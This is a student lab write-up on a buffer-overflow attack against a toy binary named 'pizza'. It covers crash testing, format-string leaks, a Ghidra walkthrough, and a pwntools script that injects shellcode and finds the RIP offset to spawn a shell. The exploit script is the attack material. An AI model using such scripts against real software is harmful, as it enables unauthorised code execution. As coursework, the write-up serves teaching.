#  Control Flow Integrity Violation 


The Weeks Lab focus was on Writing a python script using `pwntools` that executes a given program named `pizza.c`, leaks the stack offset, and spawns a shell. Technique used is `buffer overflow`

---

After downloading the victim program: pizza to my desktop and executed it in my terminal with the command `./pizza`; I obtained the error output `bash: ./pizza: Permission denied`, hence, I added execute permissions to the pizza file with the command chmod +x pizza. Rerun the victim program named pizza and did not encountered error.

After running the victim program: pizza to see how it works as it can be shown from the image below:

![Screenshot from 2023-04-30 12-09-30](https://user-images.githubusercontent.com/66968869/235370146-73381ada-ad4d-47cd-9d69-4d2da068bf7f.png)

I then proceeded to Install pwntools by running `pip install pwntools` in my terminal to install pwntools library for Python on my system.

I tried getting to make the victim program "pizza" to crash by entering a long string of the alphabet `A` as my name or prompt for illustration. This led to an output with a segmentation fault in the image as shown below:

![Screenshot from 2023-04-30 12-53-35](https://user-images.githubusercontent.com/66968869/235371217-5ed04c10-2570-4632-a599-71713944d353.png)

Also using format strings to make something strange happen; by running the executable "pizza" and passing in some format string characters, it can be seen that the program is vulnerable(by providing memory addresses) as it can be seen from the image below as a sample output:

![Screenshot from 2023-04-30 16-07-40](https://user-images.githubusercontent.com/66968869/235378266-9a28a003-1ae5-4af0-8cc7-232930b2ebbe.png)

Moreover, running the file `python3 python_injection.py` provided the output below:

![Screenshot from 2023-04-30 16-00-49](https://user-images.githubusercontent.com/66968869/235378272-5416a3b1-c783-46f2-a5bf-8a86afd1dea4.png)

Furthermore, Opening the executable in Ghidra to really see how it works (and the library functions it is using). From the C code in Ghidra disassemble pane it can be seen that, the program is a basic pizza delivery application that accepts a user's name, the quantity of pizzas they wish to purchase, and their credit card information and then calculates the total cost of the transaction. In terms of how it works; the program starts by declaring some variables, including a pointer to a character array that will hold the user's name, a pointer to a block of memory allocated with malloc, and various local variables of different types. The program then prompts the user to enter their name using the print function and reads the input using the getline function. If getline returns 0, the program exits with an error message otherwise, the program then calls the getname function (a custom function defined), passing it pointers as arguments. The program then enters a loop that prompts the user to enter the number of pizzas they want to order using the print function and reads the input using the scanf function. This loop continues until the user enters a valid number between 1 and 10. Once the user enters a valid number, the program calculates the total cost of the order and displays a message using the printf function.The program then reads the user's credit card information using the scanf function and displays a confirmation message using the printf function. The program makes use of the following library functions including but not limited to `malloc` to allocate memory dynamically, `getline` to read input from the user, `printf` to display messages to the user and `scanf` to read input from the user.

Lastly, running the victim program "pizza" in GDB.

## python script using `pwntools` that executes the given program [pizza], leaks the stack offset, and spawns a shell.
Below is a script in python to run the pizza program, getting the pizza program executable to crash (segfault), stack offset and spawning of the shell. 
```
!/usr/bin/env python3

from pwn import *

<!-- Setting up context -->
context.arch = 'amd64'
context.os = 'linux'

binary = './pizza'

offset = 72  # found via manual testing
shellcode = asm(shellcraft.amd64.linux.sh())
padding = b'A' * (offset - len(shellcode))
payload = shellcode + padding + p64(0xdeadbeef)

p = process(binary)

p.sendline(payload)

pattern = cyclic(1000, n=8)
p = process(binary)
p.sendline(pattern)
p.wait()
core = p.corefile
rip_offset = cyclic_find(core.rip, n=8)
log.info(f'RIP offset: {rip_offset}')

padding = b'A' * rip_offset
rip = p64(core.rip)
payload = padding + rip + b'\n'
p = process(binary)
p.send(payload)

p.interactive()

```
The #!/usr/bin/env python3 instruction at the beginning of this script is used for specifying the version of python interpreter and its dependencies to use when parsing the script. rAlso the instruction `from pwn import *` which is normally used in exploit development to import the "pwntools" library, to provide a set of useful tools and utilities for interacting with vulnerable programs and services and also  providing functionalities for compiling and executing shellcode. Also,
context is one of the function's of "pwntools" library that is used to set various context variables that affect the behavior of the library when interacting with vulnerable programs and services. Arch, os, endian, and word_size variables are some of the options that can be set using the context function. Also the command `binary = './pizza'` to define the targeted executable and linkable format.

![Screenshot from 2023-05-01 07-03-16](https://user-images.githubusercontent.com/66968869/235553801-eab2b4a9-3a04-43ee-b9b3-01a0da7dcc42.png)
